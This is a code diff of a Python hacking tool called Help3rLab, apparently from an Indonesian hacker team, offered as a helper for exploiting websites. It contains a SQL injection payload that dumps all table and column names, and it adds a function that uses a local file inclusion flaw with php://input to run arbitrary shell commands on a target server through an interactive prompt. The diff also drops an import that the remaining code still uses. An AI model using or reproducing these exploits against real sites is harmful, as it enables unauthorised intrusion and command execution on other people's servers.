@@ -1,35 +1,52 @@
+# -*- coding: utf-8 -*-
 #!/usr/bin/python
-import requests,sys,os,readline,re,binascii
-from urllib.parse import unquote
-import time
+
+import requests, sys, os, readline, re, binascii, pprint, time
+
+try:
+    from urllib.parse import urlparse
+except ImportError:
+    from urlparse import urlparse
+
+# reload(sys)
+# sys.setdefaultencoding('utf8')
 
 dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
 
 def banner():
     print("""
-
-
-   /yy+.`       `.+sy/     _  _  ____  __    ____  ____  ____  __     ___  ____
-     `:sy/`   `+ys:`      / )( \(  __)(  )  (  _ \( __ \(  _ \(  )   / _ \(  _ \`
-   .``  `od:::do`  ``.    ) __ ( ) _) / (_/\ ) __/ (__ ( )   // (_/\(__  ( ) _ (
-   /ys.  /NMMMN/  .sy/    \_)(_/(____)\____/(__)  (____/(__\_)\____/  (__/(____/
-    `do--ossyyyo--od`     ------------------------------------------------------
-    `oyNNNNNdNNNNNy+`     Author : Fauzanw ft Rizsyad AR
-```/yoyMMMMM`MMMMMyoy/``` Team   : { IndoSec }
-+sys-:sMMMMM`MMMMMs::sys+ Help3rL4b is your helper lab to exploit security holes
- `.`do/MMMMM`MMMMM/od`.`  We not responsible for damage caused by Help3rL4b,
-    m:.NMMMM`MMMMN.:m    
- `/yy. :mMMM`MMMm: .yy/` 
-.y/``   `:os`so:`   ``/y.
+\033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+\033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m......\033[97m%%%%%\033[90m...\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m..\033[97m%%%%%\033[90m...\033[97m%%\033[90m.......\033[97m%%%%\033[90m...\033[97m%%%%%\033[90m..\033[97m]
+\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[90;1m|..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m.\033[97m]
+\033[97m[\033[90m.\033[97m%%%%%%\033[90m..\033[97m%%%%\033[90m....\033[97m%%\033[90m......\033[97m%%%%%\033[90m...\033[90;1m|\033[90m..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%%%%\033[90m...\033[97m%%\033[90m......\033[97m%%%%%%\033[90m..\033[97m%%%%%\033[90m..\033[97m]
+\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m......\033[97m%%\033[90m......\033[90;1m|..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m.\033[97m]
+\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m......\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%\033[90m\033[90m..\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
+\033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]                        
+\033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+       =[ \033[93;2mHelp3rLab v.0.1 Beta\033[97;0m                                    ]=
++ -- --=[ Author : Fauzanw ft Rizsyad AR                          ]=-- -- +
++ -- --=[ Team   : { IndoSec }                                    ]=-- -- +
++ -- --=[ Help3rLab is your helper lab to exploit security holes  ]=-- -- + 
++ -- --=[ We not responsible for damage caused by Help3rL4b,      ]=-- -- +   
     """)
 
 def menu():
     print("""
 [\033[91m+\033[97m] Options :
-└[\033[92m•\033[97m] \033[91m1. \033[97mSQL Injection 
+└[\033[92m•\033[97m] \033[91m1. \033[97mSQL Injection
 └[\033[92m•\033[97m] \033[91m2. \033[97mRemote File Inclusion
 └[\033[92m•\033[97m] \033[91m3. \033[97mLocal File Inclusion
 └[\033[92m•\033[97m] \033[91m4. \033[97mRemote Command Execution
+└[\033[92m•\033[97m] \033[91m5. \033[97mLFI to RCE
 """)
 
 def check_vuln_sqli(url):
@@ -80,19 +97,53 @@ def execute_sqli(url, user):
         execute_sqli(url, user)
 
 def sqli():
-    print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,inject,5-- -")
-    url = input("[?] URL : ")
+    print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,*,5-- -")
+    # url = input("[?] URL : ")
+    url = input("[?] URL: ")
+
     if re.search("http", url):
         url = url
     elif re.search('\%68\%74\%74\%70', url):
         url = unquote(url)
     else:
         url = "http://"+url
-    print("\033[97m[\033[93m!\033[97m] Testing your target...")
     check_vuln_sqli(url)
+
+def lfitorce():
+    url = input("[?] Input Url : ")
+    injection = input("[?] Injection parameter (ex. ?page=Data) : ")
+    pisah = injection.split("=")
+
+    print("\n")
+    print("[!] Loading to injection RCE...")
+    time.sleep(2)
+    
+    delete_whitelist = url.replace(injection, "")
+    payload = "php://input"
+    in_payload = pisah[0] + "=" + payload
+    
+    print("[!] Requets to target...")
+    time.sleep(2)
+    
+    print("\n")
+    
+    i = 0
+    
+    while i < 1:
+        injection_command = input("RCE@injection:# ")
+        command = "<?php system('"+ injection_command +"'); ?>"
+        rce = requests.post(delete_whitelist + in_payload, data=command)
+        print(rce.text)
+        if injection_command == 'exit':
+            i = 1
+
 
 banner()
 menu()
+
 action = input("\n[\033[93m?\033[97m] Options : ")
+
 if action == "1":
     sqli()
+elif action == "5":
+    lfitorce()
